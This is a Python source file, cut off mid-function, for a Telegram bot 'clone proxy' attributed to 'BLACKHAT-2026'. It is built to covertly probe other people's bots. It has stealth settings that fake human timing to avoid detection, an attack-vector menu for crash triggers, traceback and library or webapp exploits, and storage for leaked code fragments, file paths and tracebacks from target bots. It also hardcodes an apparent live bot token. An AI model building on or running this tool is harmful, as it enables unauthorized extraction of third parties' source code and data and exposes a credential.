#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TELEGRAM BOT CLONE PROXY v4.0 - ULTIMATE BEHAVIORAL MIRROR (HTML FIXED)
Author: BLACKHAT-2026
"""

# ============================================================================
# ALL IMPORTS (same as before)
# ============================================================================

import asyncio
import json
import sqlite3
import re
import hashlib
import random
import time
import logging
import difflib
import os
import sys
import threading
import uuid
import string
import signal
import zipfile
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple, Union, Set
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from contextlib import asynccontextmanager
from io import BytesIO

# Third-party imports
from aiogram import Bot, Dispatcher, types, F, Router
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
    ForceReply, Chat, User, ChatMemberUpdated, ChatJoinRequest,
    InlineQuery, ChosenInlineResult, Poll, PollAnswer,
    ShippingQuery, PreCheckoutQuery, FSInputFile, BufferedInputFile
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.utils.chat_action import ChatActionSender
from aiogram.exceptions import (
    TelegramBadRequest, TelegramForbiddenError, TelegramRetryAfter,
    TelegramUnauthorizedError, TelegramNetworkError
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ============================================================================
# CONFIGURATION & CONSTANTS
# ============================================================================

VERSION = "4.0.0-ULTIMATE-FIXED"
BOT_TOKEN = "8653501255:AAGOwfrDxKYa3aHxWAu_FA915SAPtlotqhw"  # YOUR TOKEN

CONFIG_DIR = Path("clone_data")
CONFIG_DIR.mkdir(exist_ok=True)
DB_PATH = CONFIG_DIR / "clone_db.sqlite"
SESSIONS_DIR = CONFIG_DIR / "sessions"
SESSIONS_DIR.mkdir(exist_ok=True)
EXPORTS_DIR = CONFIG_DIR / "exports"
EXPORTS_DIR.mkdir(exist_ok=True)
LOGS_DIR = CONFIG_DIR / "logs"
LOGS_DIR.mkdir(exist_ok=True)
MEDIA_CACHE_DIR = CONFIG_DIR / "media_cache"
MEDIA_CACHE_DIR.mkdir(exist_ok=True)

# Advanced logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOGS_DIR / f'bot_clone_{datetime.now().strftime("%Y%m%d")}.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Stealth configuration
STEALTH_LEVELS = {
    "paranoid": {
        "typing_variance": (0.5, 2.5),
        "delay_multiplier": (0.8, 1.2),
        "burst_probability": 0.1,
        "human_error_prob": 0.02,
        "session_rotation": True,
        "max_actions_per_min": 25,
        "cooldown_between_bots": 5.0,
        "jitter_range": (0.1, 0.5),
        "response_variance": (0.7, 1.3),
        "think_time_range": (1.0, 3.0)
    },
    "balanced": {
        "typing_variance": (0.3, 1.5),
        "delay_multiplier": (0.9, 1.1),
        "burst_probability": 0.2,
        "human_error_prob": 0.01,
        "session_rotation": True,
        "max_actions_per_min": 35,
        "cooldown_between_bots": 3.0,
        "jitter_range": (0.05, 0.3),
        "response_variance": (0.8, 1.2),
        "think_time_range": (0.8, 2.0)
    },
    "aggressive": {
        "typing_variance": (0.1, 0.8),
        "delay_multiplier": (0.95, 1.05),
        "burst_probability": 0.3,
        "human_error_prob": 0.005,
        "session_rotation": False,
        "max_actions_per_min": 50,
        "cooldown_between_bots": 1.0,
        "jitter_range": (0.01, 0.1),
        "response_variance": (0.9, 1.1),
        "think_time_range": (0.5, 1.5)
    }
}

# ============================================================================
# FIXED DATABASE MANAGER
# ============================================================================

class DatabaseManager:
    """Enhanced thread-safe database operations with connection pooling"""
    
    _instance = None
    _connection_pool = {}
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialize()
        return cls._instance
    
    def _initialize(self):
        """Initialize database and create tables"""
        self._create_tables()
    
    def _get_connection(self):
        """Get or create database connection"""
        thread_id = threading.get_ident()
        if thread_id not in self._connection_pool:
            conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
            conn.row_factory = sqlite3.Row
            conn.execute("PRAGMA foreign_keys = ON")
            conn.execute("PRAGMA journal_mode = WAL")
            conn.execute("PRAGMA synchronous = NORMAL")
            self._connection_pool[thread_id] = conn
        return self._connection_pool[thread_id]
    
    def _create_tables(self):
        """Create all database tables if they don't exist"""
        try:
            conn = self._get_connection()
            c = conn.cursor()
            
            # Target bots table
            c.execute('''
                CREATE TABLE IF NOT EXISTS target_bots (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT UNIQUE NOT NULL,
                    added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    description TEXT,
                    first_seen TIMESTAMP,
                    last_active TIMESTAMP,
                    total_interactions INTEGER DEFAULT 0,
                    success_rate REAL DEFAULT 0,
                    avg_response_time REAL DEFAULT 0,
                    metadata TEXT
                )
            ''')
            
            # Sessions table
            c.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_uuid TEXT UNIQUE NOT NULL,
                    user_id INTEGER NOT NULL,
                    target_bot_id INTEGER NOT NULL,
                    stealth_level TEXT DEFAULT 'balanced',
                    start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    end_time TIMESTAMP,
                    interactions INTEGER DEFAULT 0,
                    status TEXT DEFAULT 'active',
                    metadata TEXT,
                    FOREIGN KEY (target_bot_id) REFERENCES target_bots(id)
                )
            ''')
            
            # Interactions table
            c.execute('''
                CREATE TABLE IF NOT EXISTS interactions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id INTEGER,
                    target_bot_id INTEGER NOT NULL,
                    direction TEXT CHECK(direction IN ('user_to_target', 'target_to_user')),
                    message_type TEXT,
                    content_hash TEXT,
                    response_time_ms INTEGER,
                    raw_data TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (session_id) REFERENCES sessions(id),
                    FOREIGN KEY (target_bot_id) REFERENCES target_bots(id)
                )
            ''')
            
            # Button flows table
            c.execute('''
                CREATE TABLE IF NOT EXISTS button_flows (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_bot_id INTEGER NOT NULL,
                    from_state TEXT,
                    button_text TEXT,
                    button_callback_data TEXT,
                    to_state TEXT,
                    response_type TEXT,
                    response_hash TEXT,
                    frequency INTEGER DEFAULT 1,
                    last_seen TIMESTAMP,
                    confidence REAL DEFAULT 0.5,
                    metadata TEXT,
                    FOREIGN KEY (target_bot_id) REFERENCES target_bots(id),
                    UNIQUE(target_bot_id, from_state, button_callback_data, to_state)
                )
            ''')
            
            # Patterns table
            c.execute('''
                CREATE TABLE IF NOT EXISTS patterns (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_bot_id INTEGER NOT NULL,
                    pattern_type TEXT,
                    regex TEXT,
                    sample_value TEXT,
                    confidence REAL,
                    detected_at TIMESTAMP,
                    occurrences INTEGER DEFAULT 1,
                    metadata TEXT,
                    FOREIGN KEY (target_bot_id) REFERENCES target_bots(id)
                )
            ''')
            
            # Timing patterns table
            c.execute('''
                CREATE TABLE IF NOT EXISTS timing_patterns (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_bot_id INTEGER NOT NULL,
                    from_state TEXT,
                    to_state TEXT,
                    avg_delay REAL,
                    std_dev REAL,
                    min_delay REAL,
                    max_delay REAL,
                    sample_count INTEGER,
                    last_updated TIMESTAMP,
                    FOREIGN KEY (target_bot_id) REFERENCES target_bots(id)
                )
            ''')
            
            # Media cache table
            c.execute('''
                CREATE TABLE IF NOT EXISTS media_cache (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    file_hash TEXT UNIQUE,
                    file_id TEXT,
                    file_type TEXT,
                    file_size INTEGER,
                    local_path TEXT,
                    first_seen TIMESTAMP,
                    last_used TIMESTAMP,
                    use_count INTEGER DEFAULT 1,
                    metadata TEXT
                )
            ''')
            
            # Code fragments table
            c.execute('''
                CREATE TABLE IF NOT EXISTS code_fragments (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_bot_id INTEGER NOT NULL,
                    fragment_type TEXT,
                    content TEXT,
                    line_number INTEGER,
                    file_path TEXT,
                    confidence REAL,
                    source_vector TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    is_reconstructed BOOLEAN DEFAULT 0,
                    FOREIGN KEY (target_bot_id) REFERENCES target_bots(id)
                )
            ''')
            
            # Create indexes for performance
            c.execute("CREATE INDEX IF NOT EXISTS idx_interactions_target ON interactions(target_bot_id)")
            c.execute("CREATE INDEX IF NOT EXISTS idx_interactions_timestamp ON interactions(timestamp)")
            c.execute("CREATE INDEX IF NOT EXISTS idx_button_flows_target ON button_flows(target_bot_id)")
            c.execute("CREATE INDEX IF NOT EXISTS idx_patterns_target ON patterns(target_bot_id)")
            c.execute("CREATE INDEX IF NOT EXISTS idx_code_fragments_target ON code_fragments(target_bot_id)")
            c.execute("CREATE INDEX IF NOT EXISTS idx_sessions_user ON sessions(user_id)")
            c.execute("CREATE INDEX IF NOT EXISTS idx_sessions_status ON sessions(status)")
            
            conn.commit()
            logger.info("Database tables created/verified successfully")
            
        except Exception as e:
            logger.error(f"Error creating tables: {e}", exc_info=True)
            raise
    
    def execute(self, query: str, params: tuple = ()) -> sqlite3.Cursor:
        """Execute a query and return cursor"""
        conn = self._get_connection()
        try:
            return conn.execute(query, params)
        except sqlite3.Error as e:
            logger.error(f"Database error: {e}")
            raise
    
    def executemany(self, query: str, params: list) -> sqlite3.Cursor:
        """Execute many queries"""
        conn = self._get_connection()
        try:
            return conn.executemany(query, params)
        except sqlite3.Error as e:
            logger.error(f"Database error: {e}")
            raise
    
    def commit(self):
        """Commit current transaction"""
        conn = self._get_connection()
        conn.commit()
    
    def close_all(self):
        """Close all database connections"""
        for thread_id, conn in self._connection_pool.items():
            try:
                conn.close()
            except:
                pass
        self._connection_pool.clear()
    
    def add_target_bot(self, username: str, metadata: Dict = None) -> Optional[int]:
        """Add a new target bot to database"""
        try:
            conn = self._get_connection()
            
            # Check if bot already exists
            cursor = conn.execute("SELECT id FROM target_bots WHERE username = ?", (username,))
            existing = cursor.fetchone()
            
            if existing:
                return existing[0]
            
            # Insert new bot
            now = datetime.now().isoformat()
            metadata_json = json.dumps(metadata or {})
            
            cursor = conn.execute(
                """INSERT INTO target_bots 
                   (username, first_seen, last_active, metadata) 
                   VALUES (?, ?, ?, ?)""",
                (username, now, now, metadata_json)
            )
            conn.commit()
            
            return cursor.lastrowid
            
        except Exception as e:
            logger.error(f"Error adding target bot: {e}")
            return None
    
    def get_target_bots(self, limit: int = 100) -> List[Dict]:
        """Get all target bots"""
        try:
            cursor = self.execute(
                """SELECT id, username, added_date, total_interactions, success_rate, last_active 
                   FROM target_bots ORDER BY last_active DESC NULLS LAST LIMIT ?""",
                (limit,)
            )
            return [dict(row) for row in cursor.fetchall()]
        except Exception as e:
            logger.error(f"Error getting target bots: {e}")
            return []
    
    def get_target_bot(self, bot_id: int) -> Optional[Dict]:
        """Get specific target bot by ID"""
        try:
            cursor = self.execute(
                "SELECT * FROM target_bots WHERE id = ?",
                (bot_id,)
            )
            row = cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Error getting target bot: {e}")
            return None
    
    def update_bot_stats(self, bot_id: int, response_time_ms: int, success: bool = True):
        """Update bot statistics"""
        try:
            self.execute(
                """UPDATE target_bots 
                   SET total_interactions = total_interactions + 1,
                       last_active = ?,
                       avg_response_time = (avg_response_time * total_interactions + ?) / (total_interactions + 1),
                       success_rate = (success_rate * total_interactions + ?) / (total_interactions + 1)
                   WHERE id = ?""",
                (datetime.now().isoformat(), response_time_ms, 1 if success else 0, bot_id)
            )
            self.commit()
        except Exception as e:
            logger.error(f"Error updating bot stats: {e}")
    
    def create_session(self, user_id: int, target_bot_id: int, stealth_level: str = "balanced") -> Optional[str]:
        """Create a new clone session"""
        try:
            session_uuid = str(uuid.uuid4())
            self.execute(
                """INSERT INTO sessions (session_uuid, user_id, target_bot_id, stealth_level, start_time, status)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (session_uuid, user_id, target_bot_id, stealth_level, datetime.now().isoformat(), "active")
            )
            self.commit()
            return session_uuid
        except Exception as e:
            logger.error(f"Error creating session: {e}")
            return None
    
    def end_session(self, session_uuid: str):
        """End a clone session"""
        try:
            self.execute(
                "UPDATE sessions SET end_time = ?, status = 'ended' WHERE session_uuid = ?",
                (datetime.now().isoformat(), session_uuid)
            )
            self.commit()
        except Exception as e:
            logger.error(f"Error ending session: {e}")
    
    def add_interaction(self, interaction: Dict) -> Optional[int]:
        """Store an interaction"""
        try:
            content_hash = hashlib.sha256(
                json.dumps(interaction.get("raw_data", ""), sort_keys=True).encode()
            ).hexdigest()
            
            cursor = self.execute(
                """INSERT INTO interactions 
                   (session_id, target_bot_id, direction, message_type, content_hash, response_time_ms, raw_data)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (
                    interaction.get("session_id"),
                    interaction.get("target_bot_id"),
                    interaction.get("direction"),
                    interaction.get("message_type", "unknown"),
                    content_hash,
                    interaction.get("response_time_ms", 0),
                    json.dumps(interaction.get("raw_data", {}))
                )
            )
            self.commit()
            return cursor.lastrowid
        except Exception as e:
            logger.error(f"Error adding interaction: {e}")
            return None
    
    def add_button_flow(self, flow_data: Dict):
        """Record button flow pattern"""
        try:
            self.execute(
                """INSERT INTO button_flows 
                   (target_bot_id, from_state, button_text, button_callback_data, 
                    to_state, response_type, response_hash, last_seen, confidence)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                   ON CONFLICT(target_bot_id, from_state, button_callback_data, to_state) 
                   DO UPDATE SET frequency = frequency + 1, last_seen = ?""",
                (
                    flow_data["target_bot_id"],
                    flow_data.get("from_state", "unknown"),
                    flow_data.get("button_text", "unknown"),
                    flow_data["button_callback_data"],
                    flow_data.get("to_state", "unknown"),
                    flow_data.get("response_type", "text"),
                    flow_data.get("response_hash", ""),
                    datetime.now().isoformat(),
                    flow_data.get("confidence", 0.5),
                    datetime.now().isoformat()
                )
            )
            self.commit()
        except Exception as e:
            logger.error(f"Error adding button flow: {e}")
    
    def add_timing_pattern(self, target_bot_id: int, from_state: str, to_state: str, delay: float):
        """Record timing pattern between states"""
        try:
            cursor = self.execute(
                """SELECT avg_delay, std_dev, min_delay, max_delay, sample_count 
                   FROM timing_patterns 
                   WHERE target_bot_id = ? AND from_state = ? AND to_state = ?""",
                (target_bot_id, from_state, to_state)
            )
            existing = cursor.fetchone()
            
            if existing:
                avg_delay, std_dev, min_delay, max_delay, sample_count = existing
                new_count = sample_count + 1
                new_avg = avg_delay + (delay - avg_delay) / new_count
                
                # Update standard deviation
                if sample_count > 1:
                    new_std = (((std_dev**2 * (sample_count - 1)) + 
                               (delay - avg_delay) * (delay - new_avg)) / new_count) ** 0.5
                else:
                    new_std = abs(delay - new_avg)
                
                new_min = min(min_delay, delay)
                new_max = max(max_delay, delay)
                
                self.execute(
                    """UPDATE timing_patterns 
                       SET avg_delay = ?, std_dev = ?, min_delay = ?, max_delay = ?, 
                           sample_count = ?, last_updated = ?
                       WHERE target_bot_id = ? AND from_state = ? AND to_state = ?""",
                    (new_avg, new_std, new_min, new_max, new_count, datetime.now().isoformat(),
                     target_bot_id, from_state, to_state)
                )
            else:
                self.execute(
                    """INSERT INTO timing_patterns 
                       (target_bot_id, from_state, to_state, avg_delay, std_dev, 
                        min_delay, max_delay, sample_count, last_updated)
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                    (target_bot_id, from_state, to_state, delay, 0, delay, delay, 1, datetime.now().isoformat())
                )
            self.commit()
        except Exception as e:
            logger.error(f"Error adding timing pattern: {e}")
    
    def add_code_fragment(self, target_bot_id: int, fragment_type: str, content: str, 
                          file_path: Optional[str] = None, line_number: Optional[int] = None,
                          confidence: float = 0.5, source_vector: str = ""):
        """Store recovered code fragment"""
        try:
            self.execute(
                """INSERT INTO code_fragments 
                   (target_bot_id, fragment_type, content, file_path, line_number, confidence, source_vector)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (target_bot_id, fragment_type, content[:1000], file_path, line_number, confidence, source_vector)
            )
            self.commit()
            logger.info(f"Code fragment stored: {fragment_type} (conf: {confidence})")
        except Exception as e:
            logger.error(f"Error storing code fragment: {e}")
    
    def detect_patterns(self, target_bot_id: int, text: str) -> Dict:
        """Analyze text for patterns and store them"""
        patterns = {}
        
        try:
            # User ID / username pattern
            username_pattern = r'@(\w{5,32})'
            usernames = re.findall(username_pattern, text)
            if usernames:
                patterns['username'] = usernames[0]
                self._store_pattern(target_bot_id, 'username', username_pattern, usernames[0], 0.9)
            
            # User ID (numeric)
            userid_pattern = r'id[:\s]*(\d{5,})|user[:\s]*(\d{5,})|(\d{7,})'
            userids = re.findall(userid_pattern, text, re.IGNORECASE)
            if userids:
                matched_id = next((x for group in userids for x in group if x), None)
                if matched_id:
                    patterns['user_id'] = matched_id
                    self._store_pattern(target_bot_id, 'user_id', userid_pattern, matched_id, 0.85)
            
            # Price pattern
            price_pattern = r'[\$\€\£\¥](\d+(?:[.,]\d{2})?)|\b(\d+(?:[.,]\d{2})?)\s*(?:USD|EUR|GBP|JPY|RUB|CNY)\b'
            prices = re.findall(price_pattern, text, re.IGNORECASE)
            if prices:
                patterns['price'] = True
                self._store_pattern(target_bot_id, 'price', price_pattern, str(prices[0]), 0.8)
            
            # Order/Reference number pattern
            order_pattern = r'#?([A-Z0-9]{4,}[-]?[A-Z0-9]{2,})|order[:\s]*#?(\d+)|ref[:\s]*#?([A-Z0-9]+)'
            orders = re.findall(order_pattern, text, re.IGNORECASE)
            if orders:
                patterns['order_number'] = True
                self._store_pattern(target_bot_id, 'order_number', order_pattern, 'REF123', 0.7)
            
            # Date pattern
            date_pattern = r'\d{1,4}[/\-\.]\d{1,2}[/\-\.]\d{1,4}'
            dates = re.findall(date_pattern, text)
            if dates:
                patterns['date'] = dates[0]
                self._store_pattern(target_bot_id, 'date', date_pattern, dates[0], 0.95)
            
            # Time pattern
            time_pattern = r'\d{1,2}:\d{2}(?::\d{2})?\s*(?:AM|PM|am|pm)?'
            times = re.findall(time_pattern, text)
            if times:
                patterns['time'] = times[0]
                self._store_pattern(target_bot_id, 'time', time_pattern, times[0], 0.9)
            
            # Email pattern
            email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
            emails = re.findall(email_pattern, text)
            if emails:
                patterns['email'] = emails[0]
                self._store_pattern(target_bot_id, 'email', email_pattern, emails[0], 0.95)
            
            # Phone number pattern
            phone_pattern = r'\+\d{1,3}[\s-]?\d{1,4}[\s-]?\d{1,4}[\s-]?\d{1,9}'
            phones = re.findall(phone_pattern, text)
            if phones:
                patterns['phone'] = phones[0]
                self._store_pattern(target_bot_id, 'phone', phone_pattern, phones[0], 0.85)
                
        except Exception as e:
            logger.error(f"Error detecting patterns: {e}")
        
        return patterns
    
    def _store_pattern(self, target_bot_id: int, pattern_type: str, regex: str, sample: str, confidence: float):
        """Store detected pattern in database"""
        try:
            self.execute(
                """INSERT INTO patterns 
                   (target_bot_id, pattern_type, regex, sample_value, confidence, detected_at, occurrences)
                   VALUES (?, ?, ?, ?, ?, ?, ?)
                   ON CONFLICT DO NOTHING""",
                (target_bot_id, pattern_type, regex, sample[:100], confidence, 
                 datetime.now().isoformat(), 1)
            )
            self.commit()
        except Exception as e:
            logger.error(f"Error storing pattern: {e}")
    
    def get_bot_statistics(self, bot_id: int) -> Dict:
        """Get comprehensive statistics for a bot"""
        stats = {}
        
        try:
            # Basic stats
            cursor = self.execute(
                "SELECT * FROM target_bots WHERE id = ?",
                (bot_id,)
            )
            row = cursor.fetchone()
            stats['bot_info'] = dict(row) if row else {}
            
            # Interaction counts
            cursor = self.execute(
                """SELECT message_type, COUNT(*) as count 
                   FROM interactions WHERE target_bot_id = ? GROUP BY message_type""",
                (bot_id,)
            )
            stats['message_types'] = {row['message_type']: row['count'] for row in cursor.fetchall()}
            
            # Button flow stats
            cursor = self.execute(
                """SELECT COUNT(DISTINCT from_state) as states, COUNT(*) as total_flows,
                          MAX(frequency) as max_frequency
                   FROM button_flows WHERE target_bot_id = ?""",
                (bot_id,)
            )
            stats['flow_stats'] = dict(cursor.fetchone() or {})
            
            # Pattern stats
            cursor = self.execute(
                "SELECT pattern_type, COUNT(*) as count FROM patterns WHERE target_bot_id = ? GROUP BY pattern_type",
                (bot_id,)
            )
            stats['pattern_stats'] = {row['pattern_type']: row['count'] for row in cursor.fetchall()}
            
            # Timing stats
            cursor = self.execute(
                "SELECT AVG(avg_delay) as avg_response FROM timing_patterns WHERE target_bot_id = ?",
                (bot_id,)
            )
            row = cursor.fetchone()
            stats['avg_response'] = row['avg_response'] if row else 0
            
            # Code fragments
            cursor = self.execute(
                "SELECT COUNT(*) as fragments FROM code_fragments WHERE target_bot_id = ?",
                (bot_id,)
            )
            row = cursor.fetchone()
            stats['code_fragments'] = row['fragments'] if row else 0
            
        except Exception as e:
            logger.error(f"Error getting bot statistics: {e}")
        
        return stats

# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class InteractionRecord:
    """Record of a single interaction"""
    id: Optional[int] = None
    session_id: Optional[int] = None
    target_bot_id: Optional[int] = None
    user_message_text: Optional[str] = None
    bot_response_text: Optional[str] = None
    button_sequence: List[Dict] = field(default_factory=list)
    timestamp: datetime = field(default_factory=datetime.now)
    response_time_ms: Optional[int] = None
    metadata: Dict = field(default_factory=dict)

@dataclass
class BotState:
    """Detected bot state/menu"""
    name: str
    description: str
    buttons: List[Dict] = field(default_factory=list)
    parent_state: Optional[str] = None
    child_states: List[str] = field(default_factory=list)
    confidence: float = 0.5
    first_seen: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    visit_count: int = 1

# ============================================================================
# BOT SETUP
# ============================================================================

class CloneStates(StatesGroup):
    """FSM states for the cloning bot itself"""
    main_menu = State()
    adding_target = State()
    selecting_target = State()
    cloning_session = State()
    viewing_stats = State()
    exporting_data = State()
    settings_menu = State()
    attack_vector_selection = State()
    monitoring_attack = State()
    viewing_leaks = State()
    confirming_action = State()

# Initialize bot components
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router(name="main_router")
db = DatabaseManager()

# Global state
active_sessions: Dict[int, Dict] = {}
user_stealth_engines: Dict[int, 'StealthEngine'] = {}
user_settings: Dict[int, Dict] = defaultdict(lambda: {"stealth_level": "balanced"})

# ============================================================================
# UI COMPONENTS - FIXED WITH HTML
# ============================================================================

class UIComponents:
    """Enhanced beautiful inline keyboard builders"""
    
    @staticmethod
    def main_menu() -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="🎯 Add Target Bot", callback_data="menu_add_target"),
            InlineKeyboardButton(text="📋 List Bots", callback_data="menu_list_bots")
        )
        builder.row(
            InlineKeyboardButton(text="▶️ Start Clone Session", callback_data="menu_start_clone"),
            InlineKeyboardButton(text="📊 Statistics", callback_data="menu_stats")
        )
        builder.row(
            InlineKeyboardButton(text="⚙️ Settings", callback_data="menu_settings"),
            InlineKeyboardButton(text="📤 Export Data", callback_data="menu_export")
        )
        builder.row(
            InlineKeyboardButton(text="🔥 Attack Vectors", callback_data="menu_attack_vectors"),
            InlineKeyboardButton(text="👁️ View Leaks", callback_data="menu_view_leaks")
        )
        builder.row(
            InlineKeyboardButton(text="ℹ️ Help", callback_data="menu_help"),
            InlineKeyboardButton(text="🔄 Reset", callback_data="menu_reset")
        )
        return builder.as_markup()
    
    @staticmethod
    def attack_vector_menu() -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="🐍 Python Traceback", callback_data="attack_traceback"),
            InlineKeyboardButton(text="📚 Library Exploits", callback_data="attack_library")
        )
        builder.row(
            InlineKeyboardButton(text="🔍 Probe Commands", callback_data="attack_probe"),
            InlineKeyboardButton(text="💥 Crash Triggers", callback_data="attack_crash")
        )
        builder.row(
            InlineKeyboardButton(text="🌐 WebApp Exploits", callback_data="attack_webapp"),
            InlineKeyboardButton(text="🔄 Run ALL", callback_data="attack_all")
        )
        builder.row(
            InlineKeyboardButton(text="⬅️ Back", callback_data="menu_main")
        )
        return builder.as_markup()
    
    @staticmethod
    def settings_menu(current_level: str = "balanced") -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        
        levels = ["paranoid", "balanced", "aggressive"]
        for level in levels:
            text = f"{'🛡️' if level == 'paranoid' else '⚖️' if level == 'balanced' else '⚡'} {level.title()}"
            if level == current_level:
                text = f"✅ {text}"
            builder.row(InlineKeyboardButton(text=text, callback_data=f"stealth_{level}"))
        
        builder.row(
            InlineKeyboardButton(text="🔄 Multi-Session", callback_data="settings_multisession"),
            InlineKeyboardButton(text="📊 Active Sessions", callback_data="view_sessions")
        )
        builder.row(
            InlineKeyboardButton(text="🗑️ Clear Cache", callback_data="settings_clear_cache"),
            InlineKeyboardButton(text="📈 Reset Stats", callback_data="settings_reset_stats")
        )
        builder.row(
            InlineKeyboardButton(text="⬅️ Back", callback_data="menu_main")
        )
        return builder.as_markup()
    
    @staticmethod
    def export_menu() -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="📄 JSON Export", callback_data="export_json"),
            InlineKeyboardButton(text="🌳 Flow Diagram", callback_data="export_diagram")
        )
        builder.row(
            InlineKeyboardButton(text="🐍 Python Stubs", callback_data="export_stubs"),
            InlineKeyboardButton(text="📊 Full Report", callback_data="export_report")
        )
        builder.row(
            InlineKeyboardButton(text="📦 Export All", callback_data="export_all"),
            InlineKeyboardButton(text="📁 List Exports", callback_data="export_list")
        )
        builder.row(
            InlineKeyboardButton(text="⬅️ Back", callback_data="menu_main")
        )
        return builder.as_markup()
    
    @staticmethod
    def bot_list(bots: List[Dict], page: int = 0) -> InlineKeyboardMarkup:
        """Generate dynamic bot list with pagination"""
        builder = InlineKeyboardBuilder()
        items_per_page = 8
        start = page * items_per_page
        end = start + items_per_page
        page_bots = bots[start:end]
        
        for bot in page_bots:
            status = "🟢" if bot.get('last_active') else "⚪"
            text = f"{status} @{bot['username']} ({bot['total_interactions']} msgs)"
            builder.row(InlineKeyboardButton(text=text, callback_data=f"select_bot_{bot['id']}"))
        
        # Pagination controls
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton(text="◀️ Prev", callback_data=f"bots_page_{page-1}"))
        if end < len(bots):
            nav_buttons.append(InlineKeyboardButton(text="Next ▶️", callback_data=f"bots_page_{page+1}"))
        
        if nav_buttons:
            builder.row(*nav_buttons)
        
        builder.row(InlineKeyboardButton(text="🏠 Main Menu", callback_data="menu_main"))
        
        return builder.as_markup()
    
    @staticmethod
    def bot_action_menu(bot_id: int, username: str) -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="▶️ Clone Session", callback_data=f"clone_{bot_id}"),
            InlineKeyboardButton(text="🔥 Attack", callback_data=f"attack_{bot_id}")
        )
        builder.row(
            InlineKeyboardButton(text="📊 Stats", callback_data=f"stats_{bot_id}"),
            InlineKeyboardButton(text="📤 Export", callback_data=f"export_bot_{bot_id}")
        )
        builder.row(
            InlineKeyboardButton(text="🔙 Back", callback_data="menu_list_bots"),
            InlineKeyboardButton(text="🏠 Main", callback_data="menu_main")
        )
        return builder.as_markup()
    
    @staticmethod
    def confirm_warning() -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="⚠️ I UNDERSTAND AND ACCEPT", callback_data="ack_legal_warning")
        )
        builder.row(
            InlineKeyboardButton(text="❌ EXIT", callback_data="menu_exit")
        )
        return builder.as_markup()
    
    @staticmethod
    def clone_session_controls(target_bot: str, session_id: str) -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="⏸️ Pause", callback_data=f"pause_{session_id}"),
            InlineKeyboardButton(text="⏹️ Stop", callback_data=f"stop_{session_id}")
        )
        builder.row(
            InlineKeyboardButton(text="📊 Stats", callback_data=f"session_stats_{session_id}"),
            InlineKeyboardButton(text="📝 Notes", callback_data=f"session_notes_{session_id}")
        )
        builder.row(
            InlineKeyboardButton(text="🔙 Main", callback_data="menu_main")
        )
        return builder.as_markup()
    
    @staticmethod
    def leaks_menu(bot_id: Optional[int] = None) -> InlineKeyboardMarkup:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="📄 Tracebacks", callback_data="leaks_tracebacks"),
            InlineKeyboardButton(text="📁 File Paths", callback_data="leaks_paths")
        )
        builder.row(
            InlineKeyboardButton(text="🔤 Code Snippets", callback_data="leaks_snippets"),
            InlineKeyboardButton(text="📊 All Fragments", callback_data="leaks_all")
        )
        if bot_id:
            builder.row(
                InlineKeyboardButton(text="🎯 For Current Bot", callback_data=f"leaks_bot_{bot_id}")
            )
        builder.row(
            InlineKeyboardButton(text="⬅️ Back", callback_data="menu_main")
        )
        return builder.as_markup()
    
    @staticmethod
    def session_status(session_info: Dict) -> str:
        """Generate session status text - HTML VERSION"""
